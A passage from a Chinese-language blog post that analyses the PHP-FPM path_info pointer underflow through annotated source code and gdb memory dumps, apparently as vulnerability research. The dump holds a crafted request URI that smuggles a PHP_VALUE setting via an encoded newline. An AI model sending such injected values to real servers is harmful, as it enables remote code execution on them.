+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c</span></span><br><span class="line">request = fpm_init_request(fcgi_fd);</span><br><span class="line"></span><br><span class="line">zend_first_try &#123;</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(fcgi_accept_request(request) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">char</span> *primary_script = <span class="literal">NULL</span>;</span><br><span class="line">        request_body_fd = <span class="number">-1</span>;</span><br><span class="line">        SG(server_context) = (<span class="keyword">void</span> *) request;</span><br><span class="line">        init_request_info();</span><br><span class="line"></span><br><span class="line">        fpm_request_info();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; zend_catch &#123;</span><br><span class="line">    exit_status = FPM_EXIT_SOFTWARE;</span><br><span class="line">&#125; zend_end_try();</span><br></pre></td></tr></table></figure>
+
+<p>定位到 <code>init_request_info()</code>，这里从 Hashtable 中拿出了 <code>SCRIPT_FILENAME</code>。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbj2ygzztbj20x4047myb.jpg" alt="image.png"></p>
+<p>继续往下看，<code>pilen = 0</code>，env_path_info 减了一个正数，所以 path_info 指针将会往低地址移。XD</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk9pdbwujj20sf0ch76e.jpg" alt="image.png"></p>
+<p>为什么会是 TH_INFO 呢？看一下内存，ffe4 - 8 = ffdc，效果就是 path_info 指针往前移了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbkeclnmadj207l07zmxk.jpg" alt="image.png"></p>
+<p><strong>注意几个变量值：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *path_info = env_path_info + pilen - slen;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>env_path_info</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *env_path_info = FCGI_GETENV(request, <span class="string">"PATH_INFO"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>  Nginx 传过来的 PATH_INFO 为空，所以 env_path_info 指向的是一个空字符串。</p>
+</li>
+<li><p>pilen</p>
+<p>  空字符串，strlen 自然为 0。</p>
+</li>
+<li><p>ptlen</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *env_script_name = FCGI_GETENV(request, <span class="string">"SCRIPT_NAME"</span>);</span><br><span class="line"><span class="keyword">char</span> *script_path_translated = env_script_filename;</span><br><span class="line"><span class="keyword">char</span> *pt = estrndup(script_path_translated, script_path_translated_len);</span><br></pre></td></tr></table></figure>
+
+<p>  <code>estrndup()</code> 是 PHP 封装的内存管理函数，即分配一个可存放 NULL 结尾的字符串 <code>s</code> 的缓冲区，并将 <code>s</code> 复制到缓冲区内。</p>
+<p>  还有印象吗？Nginx 把前一部分给了 $fastcgi_script_name，后一部分给了 $fastcgi_path_info。</p>
+<p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbj2ygzztbj20x4047myb.jpg" alt="image.png"></p>
+<p>  这里的长度其实是 script_name + path_info 的长度，但是后面还有处理！</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pt) &#123;</span><br><span class="line">    <span class="keyword">while</span> ((ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'/'</span>)) || (ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'\\'</span>))) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (stat(pt, &amp;st) == <span class="number">0</span> &amp;&amp; S_ISREG(st.st_mode)) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>  ptr 指向的是 pt 中最后一个<code>/</code> 或者 <code>\</code> 开始的字符串，当 <code>*ptr = 0</code>，相当于截断，pt 就只留下前一段。再用  <code>stat()</code> 判断该文件是否存在，这一步的操作就是要提取一个实际存在的 script。</p>
+<p>  所以，最终变成了 script_name 的长度。</p>
+</li>
+<li><p>slen</p>
+<p>  len 则是总长度，最初的 env_script_filename 的长度。</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slen = len - ptlen</span><br></pre></td></tr></table></figure>
+
+<p>  一减就是被删掉的那一部分的长度，即 path_info 的长度，这里的话就是 <code>/abc\nabc</code> 的长度。</p>
+</li>
+</ul>
+<h3 id="单字节写入"><a href="#单字节写入" class="headerlink" title="单字节写入"></a>单字节写入</h3><p>仅凭一个指针偏移当然无法 RCE，继续往下找找看哪里用到了 path_info。</p>
+<p>最有意思的地方来了，单字节写入！开发者这样写的原意是什么？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">old = path_info[<span class="number">0</span>];</span><br><span class="line">path_info[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// path_info 可控，单字节写入</span></span><br><span class="line"><span class="keyword">if</span> (!orig_script_name || <span class="built_in">strcmp</span>(orig_script_name, env_path_info) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (orig_script_name) &#123;</span><br><span class="line">        FCGI_PUTENV(request, <span class="string">"ORIG_SCRIPT_NAME"</span>, orig_script_name);  <span class="comment">// exploit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    SG(request_info).request_uri = FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_path_info);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    SG(request_info).request_uri = orig_script_name;</span><br><span class="line">&#125;</span><br><span class="line">path_info[<span class="number">0</span>] = old;  <span class="comment">// 复原</span></span><br></pre></td></tr></table></figure>
+
+<p>写个 0 进去有啥用？</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbqgjhvswaj20c604qdgf.jpg" alt="image.png"></p>
+<h3 id="FCGI-PUTENV"><a href="#FCGI-PUTENV" class="headerlink" title="FCGI_PUTENV"></a>FCGI_PUTENV</h3><p>在复原 path_info 之前，还有 FCGI_PUTENV，这是一个写操作，nice。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_path_info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_PUTENV(request, name, value) \ </span></span><br><span class="line">	fcgi_quick_putenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, 			  </span><br><span class="line">						<span class="keyword">sizeof</span>(name)<span class="number">-1</span>), value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单做了下 hash，必然会出现一些一样的哈希值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line">	(UNEXPECTED(var_len &lt; <span class="number">3</span>) ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)var_len : \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-2</span>]) &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-1</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		var_len)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_putenv</span><span class="params">(fcgi_request *req, <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span>* val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (val == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		fcgi_hash_del(&amp;req-&gt;env, hash_value, var, var_len);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fcgi_hash_set(&amp;req-&gt;env, hash_value, var, var_len, val, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(val));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里梳理一下 FCGI_PUTENV 对 hash_table 的操作。代码注释不足，理解这几个结构体有一定难度，硬看！</p>
+<blockquote>
+<p>希望这个图加上下面代码的注释能稍微解释清楚这些操作，其中的链表操作可以先不看，这里用不到。</p>
+</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbqf1c4y9rj21hc0u0gsz.jpg" alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_request</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>            listen_socket;</span><br><span class="line">	<span class="keyword">int</span>            tcp;</span><br><span class="line">	<span class="keyword">int</span>            fd;</span><br><span class="line">	<span class="keyword">int</span>            id;</span><br><span class="line">	<span class="keyword">int</span>            keep;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TCP_NODELAY</span></span><br><span class="line">	<span class="keyword">int</span>            nodelay;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span>            ended;</span><br><span class="line">	<span class="keyword">int</span>            in_len;</span><br><span class="line">	<span class="keyword">int</span>            in_pad;</span><br><span class="line"></span><br><span class="line">	fcgi_header   *out_hdr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *out_pos;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  out_buf[<span class="number">1024</span>*<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>  reserved[<span class="keyword">sizeof</span>(fcgi_end_request_rec)];</span><br><span class="line"></span><br><span class="line">	fcgi_req_hook  hook; <span class="comment">// 存着 hook 函数的函数指针，分别是 on_accept(),on_read(),on_close()</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>            has_env;</span><br><span class="line">	fcgi_hash      env;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash</span> &#123;</span></span><br><span class="line">	fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];  <span class="comment">// 哈希值作为数组索引</span></span><br><span class="line">	fcgi_hash_bucket  *<span class="built_in">list</span>;	<span class="comment">// 指向当前用到了哪个 hashtable</span></span><br><span class="line">	fcgi_hash_buckets *buckets;	<span class="comment">// 顺序存储的 hashtable</span></span><br><span class="line">	fcgi_data_seg     *data;	<span class="comment">// 所有环境变量都存在这，以 var1val1var2val2 形式</span></span><br><span class="line">&#125; fcgi_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              hash_value;		<span class="comment">// 变量名的哈希值，提高存取效率，最后才比较字符串</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              var_len;</span><br><span class="line">	<span class="keyword">char</span>                     *var;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>              val_len;</span><br><span class="line">	<span class="keyword">char</span>                     *val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">list_next</span>;</span>		<span class="comment">// 上一个 bucket</span></span><br><span class="line">&#125; fcgi_hash_bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	           idx;							<span class="comment">// 当前使用了多少个 hashtable</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> *<span class="title">next</span>;</span>						<span class="comment">// 不够再加</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span>   <span class="title">data</span>[<span class="title">FCGI_HASH_TABLE_SIZE</span>];</span>	<span class="comment">// 按 fcgi_hash_set 调用顺序存储</span></span><br><span class="line">&#125; fcgi_hash_buckets;										<span class="comment">// 的 hashtable 指针。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>                  *pos;			<span class="comment">// data[] 中未使用的内存</span></span><br><span class="line">	<span class="keyword">char</span>                  *end;			<span class="comment">// data[] 的结尾地址</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span>		<span class="comment">// 如果一个 seg 存不下，再分配一个</span></span><br><span class="line">	<span class="keyword">char</span>                   data[<span class="number">1</span>];  	<span class="comment">// 等效 data[]、data[0]</span></span><br><span class="line">    								 	<span class="comment">// C 语言“变长数组”写法，所有的环境变量都存在这里。</span></span><br><span class="line">&#125; fcgi_data_seg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fcgi_hash_init</span><span class="params">(fcgi_hash *h)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(h-&gt;hash_table, <span class="number">0</span>, <span class="keyword">sizeof</span>(h-&gt;hash_table));</span><br><span class="line">	h-&gt;<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">	h-&gt;buckets = (fcgi_hash_buckets*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_hash_buckets));</span><br><span class="line">	h-&gt;buckets-&gt;idx = <span class="number">0</span>;</span><br><span class="line">	h-&gt;buckets-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 上面的 data[1] 结合这里的 malloc 就能解释清楚了，</span></span><br><span class="line"><span class="comment">    * 给结构体完分配剩下的全给 data[] 用，即 data 能用 FCGI_HASH_SEG_SIZE（4096） 个字节。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	h-&gt;data = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + FCGI_HASH_SEG_SIZE);</span><br><span class="line">	h-&gt;data-&gt;pos = h-&gt;data-&gt;data;</span><br><span class="line">	h-&gt;data-&gt;end = h-&gt;data-&gt;pos + FCGI_HASH_SEG_SIZE;</span><br><span class="line">	h-&gt;data-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">char</span> *val, <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;  <span class="comment">// 模一下，防止越界</span></span><br><span class="line">	fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (UNEXPECTED(p != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (UNEXPECTED(p-&gt;hash_value == hash_value) &amp;&amp;</span><br><span class="line">		    p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">			p-&gt;val_len = val_len;</span><br><span class="line">			p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">			<span class="keyword">return</span> p-&gt;val;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不够就加</span></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;buckets-&gt;idx &gt;= FCGI_HASH_TABLE_SIZE)) &#123;</span><br><span class="line">		fcgi_hash_buckets *b = (fcgi_hash_buckets*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_hash_buckets));</span><br><span class="line">		b-&gt;idx = <span class="number">0</span>;</span><br><span class="line">		b-&gt;next = h-&gt;buckets;</span><br><span class="line">		h-&gt;buckets = b;</span><br><span class="line">	&#125;</span><br><span class="line">	p = h-&gt;buckets-&gt;data + h-&gt;buckets-&gt;idx;  	<span class="comment">// 拿到具体的 bucket 指针</span></span><br><span class="line">	h-&gt;buckets-&gt;idx++;  					 	<span class="comment">// 表示 buckets 内有多少个了</span></span><br><span class="line">	p-&gt;next = h-&gt;hash_table[idx];</span><br><span class="line">	h-&gt;hash_table[idx] = p;  					<span class="comment">// 将 bucket 加入 hash_table</span></span><br><span class="line">	p-&gt;list_next = h-&gt;<span class="built_in">list</span>;</span><br><span class="line">	h-&gt;<span class="built_in">list</span> = p;</span><br><span class="line">	p-&gt;hash_value = hash_value;</span><br><span class="line">	p-&gt;var_len = var_len;</span><br><span class="line">	p-&gt;var = fcgi_hash_strndup(h, var, var_len);</span><br><span class="line">	p-&gt;val_len = val_len;</span><br><span class="line">	p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">	<span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="扩大攻击面"><a href="#扩大攻击面" class="headerlink" title="扩大攻击面"></a>扩大攻击面</h3><p>最重要的就是这个了，<code>h-&gt;data-&gt;pos</code> 始终指向的是结构体中未被使用的内存起始地址。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbpe0vddivj208n098jrw.jpg" alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不够就加</span></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;end)) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> seg_size = (str_len + <span class="number">1</span> &gt; FCGI_HASH_SEG_SIZE) ? str_len + <span class="number">1</span> : FCGI_HASH_SEG_SIZE;</span><br><span class="line">		fcgi_data_seg *p = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + seg_size);</span><br><span class="line"></span><br><span class="line">		p-&gt;pos = p-&gt;data;</span><br><span class="line">		p-&gt;end = p-&gt;pos + seg_size;</span><br><span class="line">		p-&gt;next = h-&gt;data;</span><br><span class="line">		h-&gt;data = p;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = h-&gt;data-&gt;pos;</span><br><span class="line">	<span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">	ret[str_len] = <span class="number">0</span>;</span><br><span class="line">	h-&gt;data-&gt;pos += str_len + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用这个 memcpy，一旦控制了 <code>h-&gt;data-&gt;pos</code> 的值，就实现了指定位置多字节写入！</p>
+<p>结合下面打印的内存可以看到，这里的偏移并不是定值，而是受多个参数的影响，env_path_info 要怎么移才可能指到 pos 的位置？</p>
+<p>能爆破吗？可以，但每次都爆就很麻烦。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/<span class="number">1</span>xg &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce00</span>:	<span class="number">0x000056457251d02f</span>					<span class="comment">// 此时将最低位置0 =&gt; 0x000056457251d000</span></span><br><span class="line"></span><br><span class="line">(gdb) x/<span class="number">60</span>s request-&gt;env-&gt;data</span><br><span class="line"><span class="number">0x56457251ce00</span>:	<span class="string">"\037\320QrEV"</span>						&lt;------------ &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce07</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce08</span>:	<span class="string">"\030\336QrEV"</span></span><br><span class="line"><span class="number">0x56457251ce0f</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce10</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce11</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce12</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce13</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce14</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce15</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce16</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce17</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce18</span>:	<span class="string">"FCGI_ROLE"</span></span><br><span class="line"><span class="number">0x56457251ce22</span>:	<span class="string">"RESPONDER"</span></span><br><span class="line"><span class="number">0x56457251ce2c</span>:	<span class="string">"QUERY_STRING"</span></span><br><span class="line"><span class="number">0x56457251ce39</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce3a</span>:	<span class="string">"REQUEST_METHOD"</span></span><br><span class="line"><span class="number">0x56457251ce49</span>:	<span class="string">"GET"</span></span><br><span class="line"><span class="number">0x56457251ce4d</span>:	<span class="string">"CONTENT_TYPE"</span></span><br><span class="line"><span class="number">0x56457251ce5a</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce5b</span>:	<span class="string">"CONTENT_LENGTH"</span></span><br><span class="line"><span class="number">0x56457251ce6a</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce6b</span>:	<span class="string">"SCRIPT_NAME"</span></span><br><span class="line"><span class="number">0x56457251ce77</span>:	<span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cea1</span>:	<span class="string">"REQUEST_URI"</span></span><br><span class="line"><span class="number">0x56457251cead</span>:	<span class="string">"/index.php/PHP_VALUE%0Asession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251ced9</span>:	<span class="string">"DOCUMENT_URI"</span></span><br><span class="line"><span class="number">0x56457251cee6</span>:	<span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cf10</span>:	<span class="string">"DOCUMENT_ROOT"</span></span><br><span class="line"><span class="number">0x56457251cf1e</span>:	<span class="string">"/var/www/html"</span></span><br><span class="line"><span class="number">0x56457251cf2c</span>:	